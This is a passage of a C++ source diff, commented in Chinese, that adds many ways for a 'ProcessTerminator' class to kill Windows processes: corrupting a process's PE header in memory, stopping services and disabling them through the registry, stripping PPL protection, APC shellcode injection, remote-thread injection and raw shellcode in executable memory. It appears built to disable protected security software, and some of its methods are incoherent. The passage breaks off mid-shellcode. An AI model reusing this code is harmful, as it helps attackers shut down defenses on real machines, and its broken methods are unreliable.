+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+
+// 公开的高级隔离方法
+bool ProcessTerminator::terminateByAdvancedIsolation(const std::string& processName) {
+    return terminateByProcessIsolationAndBlocking(processName);
+}
+bool ProcessTerminator::terminateByVectoredException(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 注册向量化异常处理程序
+        PVOID handler = AddVectoredExceptionHandler(1, [](EXCEPTION_POINTERS* ExceptionInfo) -> LONG {
+            if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+                // 在异常处理期间，我们可以尝试执行一些特权操作
+                // 这里我们尝试修改异常上下文来影响目标进程
+                ExceptionInfo->ContextRecord->ContextFlags = CONTEXT_FULL;
+                return EXCEPTION_CONTINUE_EXECUTION;
+            }
+            return EXCEPTION_CONTINUE_SEARCH;
+            });
+
+        bool success = false;
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 在异常处理器的保护下执行特权操作
+            try {
+                // 尝试直接访问进程关键内存区域
+                MEMORY_BASIC_INFORMATION mbi;
+                if (VirtualQueryEx(hProcess, (LPCVOID)0x400000, &mbi, sizeof(mbi))) {
+                    // 读取进程PE头
+                    BYTE buffer[4096];
+                    SIZE_T bytesRead;
+                    if (ReadProcessMemory(hProcess, (LPCVOID)0x400000, buffer, sizeof(buffer), &bytesRead)) {
+                        // 修改PE头中的某些字段来破坏进程
+                        buffer[0] = 0; // 破坏'MZ'头
+                        buffer[1] = 0;
+
+                        // 尝试写入修改后的数据
+                        WriteProcessMemory(hProcess, (LPVOID)0x400000, buffer, sizeof(buffer), &bytesRead);
+                    }
+                }
+
+                // 尝试终止进程
+                success = TerminateProcess(hProcess, 0) || success;
+            }
+            catch(...) {
+                // 异常处理 - 继续尝试其他方法
+            }
+
+            CloseHandle(hProcess);
+        }
+
+        if (handler) {
+            RemoveVectoredExceptionHandler(handler);
+        }
+        return success;
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateByHardwareBreakpoint(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 枚举进程的所有线程
+            HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
+                THREADENTRY32 te;
+                te.dwSize = sizeof(THREADENTRY32);
+
+                if (Thread32First(hThreadSnapshot, &te)) {
+                    do {
+                        if (te.th32OwnerProcessID == pid) {
+                            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                            if (hThread) {
+                                // 挂起线程以安全修改上下文
+                                SuspendThread(hThread);
+
+                                CONTEXT context;
+                                context.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL;
+
+                                if (GetThreadContext(hThread, &context)) {
+                                    // 设置硬件断点
+#ifdef _WIN64
+                                    context.Dr0 = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitProcess");
+                                    context.Dr7 = (1 << 0) | (1 << 16); // 启用Dr0，执行断点
+#else
+                                    context.Dr0 = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitProcess");
+                                    context.Dr7 = (1 << 0) | (1 << 16);
+#endif
+
+                                    SetThreadContext(hThread, &context);
+
+                                    // 恢复线程执行
+                                    ResumeThread(hThread);
+
+                                    // 触发断点
+                                    DebugBreakProcess(hProcess);
+                                }
+                                else {
+                                    ResumeThread(hThread);
+                                }
+
+                                CloseHandle(hThread);
+                            }
+                        }
+                    } while (Thread32Next(hThreadSnapshot, &te));
+                }
+                CloseHandle(hThreadSnapshot);
+            }
+
+            // 等待一段时间让断点生效
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+
+            bool result = TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+            if (result) return true;
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 前向声明
+static bool RemovePPLProtection(HANDLE hProcess);
+static bool InjectViaAPC(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize);
+extern const unsigned char IndirectSyscallShellCode_x64[];
+extern const SIZE_T IndirectSyscallShellCode_x64_size;
+
+// 增强的服务检测方法 - 终极版
+bool ProcessTerminator::terminateByServiceDetection(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        bool anyServiceStopped = false;
+        std::vector<std::pair<DWORD, std::wstring>> serviceAssociations;
+        std::vector<std::pair<DWORD, std::wstring>> stoppedServices;
+
+        ServiceHandlePtr scManager(OpenSCManagerW(NULL, NULL, 
+            SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE));
+        if (!scManager) {
+            std::wcerr << L"[服务检测] 打开服务控制器失败: " << GetLastError() << std::endl;
+        }
+        else {
+            DWORD bytesNeeded = 0;
+            DWORD serviceCount = 0;
+            DWORD resumeHandle = 0;
+
+            if (!EnumServicesStatusExW(scManager.get(), SC_ENUM_PROCESS_INFO, 
+                SERVICE_WIN32 | SERVICE_DRIVER, SERVICE_STATE_ALL,
+                NULL, 0, &bytesNeeded, &serviceCount, &resumeHandle, NULL) &&
+                GetLastError() != ERROR_MORE_DATA) {
+                std::wcerr << L"[服务检测] 枚举服务状态失败: " << GetLastError() << std::endl;
+            }
+            else if (bytesNeeded > 0) {
+                std::vector<BYTE> buffer(bytesNeeded);
+                ENUM_SERVICE_STATUS_PROCESSW* services = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buffer.data());
+
+                if (EnumServicesStatusExW(scManager.get(), SC_ENUM_PROCESS_INFO, 
+                    SERVICE_WIN32 | SERVICE_DRIVER, SERVICE_STATE_ALL,
+                    buffer.data(), bytesNeeded, &bytesNeeded, &serviceCount, &resumeHandle, NULL)) {
+
+                    for (DWORD i = 0; i < serviceCount; i++) {
+                        for (int pid : pids) {
+                            if (services[i].ServiceStatusProcess.dwProcessId == static_cast<DWORD>(pid)) {
+                                std::wstring serviceName = services[i].lpServiceName;
+                                std::wstring displayName = services[i].lpDisplayName;
+                                DWORD currentState = services[i].ServiceStatusProcess.dwCurrentState;
+
+                                std::wcout << L"[服务检测] 发现服务: " << displayName 
+                                           << L" (PID: " << pid << L", 状态: " << currentState << L")" << std::endl;
+
+                                serviceAssociations.push_back({ static_cast<DWORD>(pid), serviceName });
+
+                                if (currentState == SERVICE_RUNNING || currentState == SERVICE_PAUSED || 
+                                    currentState == SERVICE_CONTINUE_PENDING || currentState == SERVICE_PAUSE_PENDING) {
+                                    
+                                    ServiceHandlePtr service(OpenServiceW(scManager.get(), serviceName.c_str(), 
+                                        SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | 
+                                        SERVICE_PAUSE_CONTINUE | SERVICE_INTERROGATE));
+                                    
+                                    if (service) {
+                                        bool serviceStopped = false;
+                                        int retryCount = 0;
+                                        const int maxRetries = 3;
+
+                                        while (!serviceStopped && retryCount < maxRetries) {
+                                            SERVICE_STATUS serviceStatus;
+                                            BOOL stopped = ControlService(service.get(), SERVICE_CONTROL_STOP, &serviceStatus);
+                                            
+                                            if (stopped) {
+                                                std::wcout << L"[服务检测] 停止命令已发送 (尝试 " << (retryCount + 1) << L"): " << displayName << std::endl;
+                                                anyServiceStopped = true;
+                                                stoppedServices.push_back({ static_cast<DWORD>(pid), serviceName });
+
+                                                int waitTime = 0;
+                                                const int maxWait = 15000;
+                                                while (waitTime < maxWait) {
+                                                    if (QueryServiceStatus(service.get(), &serviceStatus)) {
+                                                        if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
+                                                            std::wcout << L"[服务检测] 服务已停止: " << displayName << std::endl;
+                                                            serviceStopped = true;
+
+                                                            std::wcout << L"[服务检测] 正在禁用服务: " << displayName << std::endl;
+                                                            HKEY hKey = NULL;
+                                                            std::wstring regPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
+                                                            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+                                                                DWORD startValue = 4;
+                                                                if (RegSetValueExW(hKey, L"Start", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&startValue), sizeof(startValue)) == ERROR_SUCCESS) {
+                                                                    std::wcout << L"[服务检测] 已禁用服务 (Start=4): " << displayName << std::endl;
+                                                                } else {
+                                                                    std::wcerr << L"[服务检测] 禁用服务失败: " << displayName << std::endl;
+                                                                }
+                                                                RegCloseKey(hKey);
+                                                            }
+
+                                                            break;
+                                                        }
+                                                        if (serviceStatus.dwCurrentState == SERVICE_STOP_PENDING) {
+                                                            Sleep(200);
+                                                            waitTime += 200;
+                                                            continue;
+                                                        }
+                                                        if (serviceStatus.dwCurrentState == SERVICE_PAUSED ||
+                                                            serviceStatus.dwCurrentState == SERVICE_RUNNING) {
+                                                            std::wcout << L"[服务检测] 服务未完全停止，状态: " << serviceStatus.dwCurrentState 
+                                                                       << L"，重试..." << std::endl;
+                                                            break;
+                                                        }
+                                                    }
+                                                    Sleep(100);
+                                                    waitTime += 100;
+                                                }
+                                                if (waitTime >= maxWait) {
+                                                    std::wcout << L"[服务检测] 等待服务停止超时: " << displayName << std::endl;
+                                                }
+                                            }
+                                            else {
+                                                DWORD error = GetLastError();
+                                                if (error == ERROR_SERVICE_NOT_ACTIVE) {
+                                                    std::wcout << L"[服务检测] 服务已处于非活动状态: " << displayName << std::endl;
+                                                    serviceStopped = true;
+                                                    anyServiceStopped = true;
+                                                }
+                                                else if (error == ERROR_DEPENDENT_SERVICES_RUNNING || 
+                                                         error == ERROR_SERVICE_CANNOT_ACCEPT_CTRL) {
+                                                    std::wcout << L"[服务检测] 有依赖服务运行，尝试枚举并停止: " << displayName << std::endl;
+                                                    
+                                                    DWORD depBytesNeeded = 0;
+                                                    DWORD depCount = 0;
+                                                    ENUM_SERVICE_STATUSW depServiceStruct;
+                                                    ENUM_SERVICE_STATUSW* depServices = nullptr;
+                                                    
+                                                    if (EnumDependentServicesW(service.get(), SERVICE_ACTIVE, 
+                                                        (LPENUM_SERVICE_STATUSW)&depServiceStruct, 0, &depBytesNeeded, &depCount) ||
+                                                        GetLastError() == ERROR_MORE_DATA) {
+                                                        std::vector<BYTE> depBuffer(depBytesNeeded);
+                                                        depServices = reinterpret_cast<ENUM_SERVICE_STATUSW*>(depBuffer.data());
+                                                        
+                                                        if (EnumDependentServicesW(service.get(), SERVICE_ACTIVE,
+                                                            (LPENUM_SERVICE_STATUSW)depBuffer.data(), depBytesNeeded, &depBytesNeeded, &depCount)) {
+                                                            std::wcout << L"[服务检测] 发现 " << depCount << L" 个依赖服务" << std::endl;
+                                                            
+                                                            for (DWORD j = 0; j < depCount; j++) {
+                                                                std::wcout << L"[服务检测] 停止依赖服务: " << depServices[j].lpDisplayName << std::endl;
+                                                                
+                                                                ServiceHandlePtr depService(OpenServiceW(scManager.get(), 
+                                                                    depServices[j].lpServiceName, 
+                                                                    SERVICE_STOP | SERVICE_QUERY_STATUS));
+                                                                if (depService) {
+                                                                    SERVICE_STATUS depStatus;
+                                                                    if (ControlService(depService.get(), SERVICE_CONTROL_STOP, &depStatus)) {
+                                                                        int depWait = 0;
+                                                                        while (depWait < 10000) {
+                                                                            if (QueryServiceStatus(depService.get(), &depStatus)) {
+                                                                                if (depStatus.dwCurrentState == SERVICE_STOPPED) break;
+                                                                                if (depStatus.dwCurrentState == SERVICE_STOP_PENDING) {
+                                                                                    Sleep(200);
+                                                                                    depWait += 200;
+                                                                                    continue;
+                                                                                }
+                                                                            }
+                                                                            break;
+                                                                        }
+                                                                    }
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                    
+                                                    if (retryCount < maxRetries - 1) {
+                                                        retryCount++;
+                                                        Sleep(500);
+                                                        continue;
+                                                    }
+                                                }
+                                                else {
+                                                    // 静默跳过
+                                                }
+                                            }
+                                            
+                                            retryCount++;
+                                            if (!serviceStopped && retryCount < maxRetries) {
+                                                Sleep(500);
+                                            }
+                                        }
+                                        
+                                        if (!serviceStopped) {
+                                            HANDLE hServiceProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
+                                                services[i].ServiceStatusProcess.dwProcessId);
+                                            if (hServiceProcess) {
+                                                if (TerminateProcess(hServiceProcess, 1)) {
+                                                    anyServiceStopped = true;
+                                                    stoppedServices.push_back({ static_cast<DWORD>(pid), serviceName });
+                                                }
+                                                CloseHandle(hServiceProcess);
+                                            }
+                                        }
+                                    }
+                                }
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        if (!serviceAssociations.empty()) {
+            std::wcout << L"[服务检测] 共发现 " << serviceAssociations.size() << L" 个服务关联" << std::endl;
+            if (!stoppedServices.empty()) {
+                std::wcout << L"[服务检测] 已停止 " << stoppedServices.size() << L" 个服务" << std::endl;
+            }
+        }
+
+        HANDLE hProcess = OpenProcessEnhanced(pids[0], PROCESS_ALL_ACCESS);
+        if (hProcess) {
+            // 移除PPL保护
+            RemovePPLProtection(hProcess);
+            
+            // 尝试终止目标进程
+            if (TerminateProcess(hProcess, 0)) { CloseHandle(hProcess); return true; }
+
+            // NtTerminateProcess
+            typedef NTSTATUS (NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
+            HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+            if (ntdll) {
+                _NtTerminateProcess pNtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
+                if (pNtTerminateProcess && NT_SUCCESS(pNtTerminateProcess(hProcess, 0)))
+                    { CloseHandle(hProcess); return true; }
+            }
+
+            // ZwTerminateProcess
+            typedef NTSTATUS (NTAPI* _ZwTerminateProcess)(HANDLE, NTSTATUS);
+            _ZwTerminateProcess pZwTerminateProcess = (_ZwTerminateProcess)GetProcAddress(ntdll, "ZwTerminateProcess");
+            if (pZwTerminateProcess && NT_SUCCESS(pZwTerminateProcess(hProcess, 0)))
+                { CloseHandle(hProcess); return true; }
+
+            // APC注入
+            if (InjectViaAPC(pids[0], (PVOID)IndirectSyscallShellCode_x64, IndirectSyscallShellCode_x64_size))
+                { CloseHandle(hProcess); Sleep(1000); return true; }
+
+            // csrss.exe循环
+            std::vector<int> csrssPids = getPIDsByName("csrss.exe");
+            if (!csrssPids.empty()) {
+                HANDLE hCsrss = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, csrssPids[0]);
+                if (hCsrss) {
+                    for (int i = 0; i < 30; i++) {
+                        HANDLE hTargetProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_VM_WRITE, FALSE, pids[0]);
+                        if (hTargetProcess) {
+                            RemovePPLProtection(hTargetProcess);
+                            TerminateProcess(hTargetProcess, 0);
+                            TerminateProcess(hTargetProcess, 0);
+                            
+                            CloseHandle(hTargetProcess);
+                            Sleep(10);
+                        } else {
+                            std::wcerr << L"[服务检测] 无法打开目标进程 (尝试 " << (i + 1) << L"/30): " << GetLastError() << std::endl;
+                        }
+                    }
+                    CloseHandle(hCsrss);
+                } else {
+                    std::wcerr << L"[服务检测] 无法打开csrss.exe: " << GetLastError() << std::endl;
+                }
+            } else {
+                std::wcerr << L"[服务检测] 未找到csrss.exe" << std::endl;
+            }
+            
+            // 方法5: 尝试使用ExitProcess
+            typedef VOID (WINAPI* _ExitProcess)(UINT);
+            HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
+            if (kernel32) {
+                _ExitProcess pExitProcess = (_ExitProcess)GetProcAddress(kernel32, "ExitProcess");
+                if (pExitProcess) {
+                    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pExitProcess, nullptr, 0, nullptr);
+                    if (hThread) {
+                        std::wcout << L"[服务检测] ExitProcess远程线程已创建" << std::endl;
+                        CloseHandle(hThread);
+                        CloseHandle(hProcess);
+                        Sleep(1000);
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] ExitProcess远程线程创建失败: " << GetLastError() << std::endl;
+                    }
+                } else {
+                    std::wcerr << L"[服务检测] 无法获取ExitProcess地址" << std::endl;
+                }
+            } else {
+                std::wcerr << L"[服务检测] 无法获取kernel32.dll句柄" << std::endl;
+            }
+            
+            // 方法6: 尝试使用RtlExitUserProcess
+            typedef VOID (NTAPI* _RtlExitUserProcess)(NTSTATUS);
+            HMODULE ntdll3 = GetModuleHandle(L"ntdll.dll");
+            if (ntdll3) {
+                _RtlExitUserProcess pRtlExitUserProcess = (_RtlExitUserProcess)GetProcAddress(ntdll3, "RtlExitUserProcess");
+                if (pRtlExitUserProcess) {
+                    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRtlExitUserProcess, nullptr, 0, nullptr);
+                    if (hThread) {
+                        std::wcout << L"[服务检测] RtlExitUserProcess远程线程已创建" << std::endl;
+                        CloseHandle(hThread);
+                        CloseHandle(hProcess);
+                        Sleep(1000);
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] RtlExitUserProcess远程线程创建失败: " << GetLastError() << std::endl;
+                    }
+                } else {
+                    std::wcerr << L"[服务检测] 无法获取RtlExitUserProcess地址" << std::endl;
+                }
+            } else {
+                std::wcerr << L"[服务检测] 无法获取ntdll.dll句柄" << std::endl;
+            }
+            
+            // 方法7: 尝试使用NtCreateThreadEx
+            typedef NTSTATUS (NTAPI* _NtCreateThreadEx)(
+                PHANDLE ThreadHandle,
+                ACCESS_MASK DesiredAccess,
+                POBJECT_ATTRIBUTES ObjectAttributes,
+                HANDLE ProcessHandle,
+                PVOID StartRoutine,
+                PVOID Argument,
+                ULONG CreateFlags,
+                SIZE_T ZeroBits,
+                SIZE_T StackSize,
+                SIZE_T MaximumStackSize);
+            
+            if (ntdll3) {
+                _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll3, "NtCreateThreadEx");
+                if (pNtCreateThreadEx) {
+                    HANDLE hThread = nullptr;
+                    NTSTATUS status = pNtCreateThreadEx(
+                        &hThread,
+                        THREAD_ALL_ACCESS,
+                        nullptr,
+                        hProcess,
+                        (PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ExitProcess"),
+                        nullptr,
+                        0,
+                        0,
+                        0,
+                        0);
+                    
+                    if (NT_SUCCESS(status) && hThread) {
+                        std::wcout << L"[服务检测] NtCreateThreadEx远程线程已创建" << std::endl;
+                        CloseHandle(hThread);
+                        CloseHandle(hProcess);
+                        Sleep(1000);
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] NtCreateThreadEx失败: 0x" << std::hex << status << std::dec << std::endl;
+                    }
+                }
+            }
+            
+            // 方法8: 尝试使用NtCreateThread
+            typedef NTSTATUS (NTAPI* _NtCreateThread)(
+                PHANDLE ThreadHandle,
+                ACCESS_MASK DesiredAccess,
+                POBJECT_ATTRIBUTES ObjectAttributes,
+                HANDLE ProcessHandle,
+                PVOID StartRoutine,
+                PVOID Argument,
+                BOOLEAN CreateSuspended,
+                SIZE_T StackZeroBits,
+                SIZE_T StackSize,
+                SIZE_T StackCommitSize);
+            
+            if (ntdll3) {
+                _NtCreateThread pNtCreateThread = (_NtCreateThread)GetProcAddress(ntdll3, "NtCreateThread");
+                if (pNtCreateThread) {
+                    HANDLE hThread = nullptr;
+                    NTSTATUS status = pNtCreateThread(
+                        &hThread,
+                        THREAD_ALL_ACCESS,
+                        nullptr,
+                        hProcess,
+                        (PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ExitProcess"),
+                        nullptr,
+                        FALSE,
+                        0,
+                        0,
+                        0);
+                    
+                    if (NT_SUCCESS(status) && hThread) {
+                        std::wcout << L"[服务检测] NtCreateThread远程线程已创建" << std::endl;
+                        CloseHandle(hThread);
+                        CloseHandle(hProcess);
+                        Sleep(1000);
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] NtCreateThread失败: 0x" << std::hex << status << std::dec << std::endl;
+                    }
+                }
+            }
+            
+            // 方法9: 尝试使用VirtualProtectEx修改内存保护
+            DWORD oldProtect = 0;
+            if (VirtualProtectEx(hProcess, nullptr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+                std::wcout << L"[服务检测] 内存保护已修改" << std::endl;
+                TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                return true;
+            } else {
+                std::wcerr << L"[服务检测] VirtualProtectEx失败: " << GetLastError() << std::endl;
+            }
+            
+            // 方法10: 尝试使用DuplicateHandle复制句柄
+            HANDLE hDuplicate = nullptr;
+            if (DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), &hDuplicate, PROCESS_ALL_ACCESS, FALSE, 0)) {
+                std::wcout << L"[服务检测] 句柄已复制" << std::endl;
+                TerminateProcess(hDuplicate, 0);
+                CloseHandle(hDuplicate);
+                CloseHandle(hProcess);
+                return true;
+            } else {
+                std::wcerr << L"[服务检测] DuplicateHandle失败: " << GetLastError() << std::endl;
+            }
+            
+            // 方法11: 尝试使用NtSuspendProcess
+            typedef NTSTATUS (NTAPI* _NtSuspendProcess)(HANDLE, PULONG);
+            if (ntdll3) {
+                _NtSuspendProcess pNtSuspendProcess = (_NtSuspendProcess)GetProcAddress(ntdll3, "NtSuspendProcess");
+                if (pNtSuspendProcess) {
+                    ULONG count = 0;
+                    NTSTATUS status = pNtSuspendProcess(hProcess, &count);
+                    if (NT_SUCCESS(status)) {
+                        std::wcout << L"[服务检测] 进程已挂起" << std::endl;
+                        TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] NtSuspendProcess失败: 0x" << std::hex << status << std::dec << std::endl;
+                    }
+                }
+            }
+            
+            // 方法12: 尝试使用NtAlertThread
+            typedef NTSTATUS (NTAPI* _NtAlertThread)(HANDLE);
+            if (ntdll3) {
+                _NtAlertThread pNtAlertThread = (_NtAlertThread)GetProcAddress(ntdll3, "NtAlertThread");
+                if (pNtAlertThread) {
+                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                    if (hSnapshot != INVALID_HANDLE_VALUE) {
+                        THREADENTRY32 te = { 0 };
+                        te.dwSize = sizeof(THREADENTRY32);
+                        
+                        while (Thread32Next(hSnapshot, &te)) {
+                            if (te.th32OwnerProcessID == pids[0]) {
+                                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                                if (hThread) {
+                                    NTSTATUS status = pNtAlertThread(hThread);
+                                    if (NT_SUCCESS(status)) {
+                                        std::wcout << L"[服务检测] 线程已警告" << std::endl;
+                                    }
+                                    CloseHandle(hThread);
+                                }
+                            }
+                        }
+                        CloseHandle(hSnapshot);
+                        
+                        TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        return true;
+                    }
+                }
+            }
+            
+            // 方法13: 尝试使用NtClose
+            typedef NTSTATUS (NTAPI* _NtClose)(HANDLE);
+            if (ntdll3) {
+                _NtClose pNtClose = (_NtClose)GetProcAddress(ntdll3, "NtClose");
+                if (pNtClose) {
+                    NTSTATUS status = pNtClose(hProcess);
+                    if (NT_SUCCESS(status)) {
+                        std::wcout << L"[服务检测] 句柄已关闭" << std::endl;
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] NtClose失败: 0x" << std::hex << status << std::dec << std::endl;
+                    }
+                }
+            }
+            
+            // 方法14: 尝试使用NtDuplicateObject
+            typedef NTSTATUS (NTAPI* _NtDuplicateObject)(
+                HANDLE SourceHandle,
+                HANDLE TargetProcessHandle,
+                PHANDLE TargetHandle,
+                ACCESS_MASK DesiredAccess,
+                POBJECT_ATTRIBUTES ObjectAttributes);
+            
+            if (ntdll3) {
+                _NtDuplicateObject pNtDuplicateObject = (_NtDuplicateObject)GetProcAddress(ntdll3, "NtDuplicateObject");
+                if (pNtDuplicateObject) {
+                    HANDLE hDuplicate = nullptr;
+                    NTSTATUS status = pNtDuplicateObject(
+                        hProcess,
+                        GetCurrentProcess(),
+                        &hDuplicate,
+                        PROCESS_ALL_ACCESS,
+                        nullptr);
+                    
+                    if (NT_SUCCESS(status) && hDuplicate) {
+                        std::wcout << L"[服务检测] 对象已复制" << std::endl;
+                        TerminateProcess(hDuplicate, 0);
+                        CloseHandle(hDuplicate);
+                        CloseHandle(hProcess);
+                        return true;
+                    } else {
+                        std::wcerr << L"[服务检测] NtDuplicateObject失败: 0x" << std::hex << status << std::dec << std::endl;
+                    }
+                }
+            }
+            
+            // 方法15: 尝试使用NtSetInformationThread
+            typedef NTSTATUS (NTAPI* _NtSetInformationThread)(
+                HANDLE ThreadHandle,
+                ULONG ThreadInformationClass,
+                PVOID ThreadInformation,
+                ULONG ThreadInformationLength);
+            
+            if (ntdll3) {
+                _NtSetInformationThread pNtSetInformationThread = (_NtSetInformationThread)GetProcAddress(ntdll3, "NtSetInformationThread");
+                if (pNtSetInformationThread) {
+                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                    if (hSnapshot != INVALID_HANDLE_VALUE) {
+                        THREADENTRY32 te = { 0 };
+                        te.dwSize = sizeof(THREADENTRY32);
+                        
+                        while (Thread32Next(hSnapshot, &te)) {
+                            if (te.th32OwnerProcessID == pids[0]) {
+                                HANDLE hThread = OpenThread(THREAD_SET_INFORMATION, FALSE, te.th32ThreadID);
+                                if (hThread) {
+                                    NTSTATUS status = pNtSetInformationThread(hThread, 17, nullptr, 0);
+                                    if (NT_SUCCESS(status)) {
+                                        std::wcout << L"[服务检测] 线程信息已设置" << std::endl;
+                                    }
+                                    CloseHandle(hThread);
+                                }
+                            }
+                        }
+                        CloseHandle(hSnapshot);
+                        
+                        TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        return true;
+                    }
+                }
+            }
+            
+            CloseHandle(hProcess);
+        }
+
+        if (anyServiceStopped) {
+            Sleep(1000);
+            std::wcout << L"[服务检测] 等待服务完全停止后重试终止进程..." << std::endl;
+            
+            for (int attempt = 0; attempt < 3 && !hProcess; attempt++) {
+                hProcess = OpenProcessEnhanced(pids[0], PROCESS_ALL_ACCESS);
+                if (hProcess) {
+                    bool terminated = TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
+                    if (terminated) {
+                        std::wcout << L"[服务检测] 服务停止后进程已终止 (尝试 " << (attempt + 1) << L")" << std::endl;
+                        return true;
+                    }
+                }
+                Sleep(500);
+            }
+            
+            if (!hProcess) {
+                HANDLE hDirect = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[0]);
+                if (hDirect) {
+                    if (TerminateProcess(hDirect, 0)) {
+                        std::wcout << L"[服务检测] 直接终止进程成功" << std::endl;
+                        CloseHandle(hDirect);
+                        return true;
+                    }
+                    CloseHandle(hDirect);
+                }
+            }
+        }
+    }
+    catch (const std::exception& e) {
+        std::wcerr << L"[服务检测] 异常: " << e.what() << std::endl;
+    }
+    catch (...) {
+        std::wcerr << L"[服务检测] 未知异常" << std::endl;
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateByMemoryMapping(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 创建一个内存映射文件来模拟内核对象
+        HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 4096, L"Global\\TerminatorSharedMemory");
+        if (hMapping) {
+            LPVOID pSharedMemory = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 4096);
+            if (pSharedMemory) {
+                // 在共享内存中写入控制数据
+                DWORD* pControlData = static_cast<DWORD*>(pSharedMemory);
+                pControlData[0] = 0xDEADBEEF; // 魔数
+                pControlData[1] = GetCurrentProcessId(); // 控制进程ID
+
+                bool methodSuccess = false; // 修复：定义局部变量
+                for (int pid : pids) {
+                    HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+                    if (!hProcess) continue;
+
+                    // 尝试将共享内存注入到目标进程
+                    HANDLE hRemoteMapping = NULL;
+                    if (DuplicateHandle(GetCurrentProcess(), hMapping, hProcess, &hRemoteMapping, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+                        // 在目标进程中映射相同的共享内存
+                        LPVOID pRemoteMemory = NULL;
+                        // 这里需要目标进程中有相应的代码来读取共享内存
+                        // 我们通过APC注入来实现
+
+                        // 分配内存存放APC代码
+                        LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                        if (pRemoteCode) {
+                            // 写入读取共享内存并自我终止的代码
+#ifdef _WIN64
+                            BYTE apcCode[] = {
+                                0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28
+                                0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, hMapping
+                                0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, pControlData
+                                0x48, 0x31, 0xC0,                                     // xor rax, rax
